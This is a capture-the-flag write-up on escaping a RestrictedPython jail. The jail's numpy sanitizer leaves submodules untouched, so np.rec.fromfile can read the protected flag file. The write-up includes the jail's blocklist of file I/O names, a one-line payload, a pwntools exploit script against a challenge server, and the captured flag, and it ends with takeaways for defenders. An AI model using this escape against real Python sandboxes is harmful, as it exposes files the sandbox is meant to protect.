# Jail — CTF Writeup

## Challenge Overview

We're given a Python jail running behind `socat` on a remote server. The jail uses **RestrictedPython** to compile and execute a single line of user input inside a heavily sandboxed environment. The flag is stored at `flag.txt` in the working directory (`/srv`), with permissions `chmod 000` (only readable by root — which is the user running the process).

**Key files:**
- `jail.py` — the sandbox implementation
- `Dockerfile` — Python 3.13, RestrictedPython, numpy 2.3.5

## Sandbox Analysis

### RestrictedPython guards

RestrictedPython's `safe_builtins` is extremely restrictive — it strips out nearly all useful builtins including `getattr`, `list`, `next`, `type`, `object`, `filter`, `map`, `print`, `open`, and `__import__`. Only basic types (`str`, `int`, `float`, `bool`, `bytes`, `tuple`), some utilities (`sorted`, `range`, `len`, `isinstance`, `setattr`), and exception classes survive.

### Runtime hooks

The jail configures four critical RestrictedPython hooks:

```python
restricted_globals.update({
    "_getattr_": getattr,       # attribute access handler
    "_getitem_": lambda obj, idx: obj[idx],  # subscript handler
    "_write_":   lambda x: x,   # write guard (identity = no guard)
    "_print_":   Print,         # print handler
})
```

The `_getattr_` is set to the **real, unguarded `getattr`** — this means any attribute access (`x.y`) compiles to `_getattr_(x, 'y')` which calls real `getattr(x, 'y')`. This is the first piece of the puzzle.

### numpy sanitization

```python
BLOCKS = ['load', 'save', 'savez', 'savez_compressed', 'loadtxt', 'savetxt',
          'genfromtxt', 'fromregex', 'fromfile', 'tofile', 'memmap',
          'DataSource', 'ctypeslib', 'f2py', 'lib', 'testing', 'ma']

def safe_module(mod):
    safe = types.ModuleType(mod.__name__)
    for name in dir(mod):
        if not name.startswith('_') and not name in BLOCKS:
            setattr(safe, name, getattr(mod, name))
    return safe
```

This creates a sanitized copy of the numpy module, removing:
- All private/dunder attributes (names starting with `_`)
- All names in the `BLOCKS` list (file I/O functions like `load`, `fromfile`, `loadtxt`, etc.)

## The Vulnerability

The `safe_module()` function only sanitizes **top-level** numpy attributes. It iterates over `dir(numpy)` and copies allowed names to a new module object. However, **submodules are copied as-is** — they are real module references, not sanitized copies.

When `safe_module` encounters `rec` in `dir(numpy)`, it sees it's not in `BLOCKS` and doesn't start with `_`, so it copies the **real** `numpy.rec` module reference directly. This means:

- `np.rec` → the real, unmodified `numpy.rec` submodule  
- `np.rec.fromfile` → the real `numpy.rec.fromfile` function (**not blocked!**)

The blocklist prevents `np.fromfile` (the top-level numpy function), but `np.rec.fromfile` is a completely different function on an unsanitized submodule — it slips through.

## Exploitation

`numpy.rec.fromfile()` reads a file from disk into a numpy record array. By using `dtype='S1'` (1-byte strings), we can read any file byte-by-byte, then convert it back to raw bytes with `.tobytes()`.

### Payload

```python
x = np.rec.fromfile('flag.txt', dtype='S1');print(x.tobytes())
```

### Exploit script

```python
from pwn import *

r = remote('34.107.64.195', 32616)
r.recvuntil(b'>>> ')
r.sendline(b"x = np.rec.fromfile('flag.txt', dtype='S1');print(x.tobytes())")
print(r.recvall(timeout=5).decode())
```

### Output

```
b'CTF{73fca295d9702c41a7d8474ca438d1d7cb8111f59a9ce5bfc1de47d488b7a890}\n'
```

## Flag

```
CTF{73fca295d9702c41a7d8474ca438d1d7cb8111f59a9ce5bfc1de47d488b7a890}
```

## Key Takeaways

1. **Submodule sanitization depth matters.** The `safe_module()` function only sanitizes one level deep. Submodules like `np.rec`, `np.linalg`, `np.random`, etc. are copied as real module references with full, unrestricted access to their own attributes — including file I/O functions.

2. **Blocklists are fragile.** The blocklist targets top-level numpy names (`fromfile`, `load`, etc.), but `numpy.rec.fromfile` is a different code path on a different module that provides equivalent file-reading capability.

3. **Defense in depth.** Even with RestrictedPython's restrictive `safe_builtins`, the combination of real `getattr` as `_getattr_` and unsanitized submodules creates a trivial escape path. A recursive sanitization approach or OS-level sandboxing (seccomp, chroot) would have been more robust.
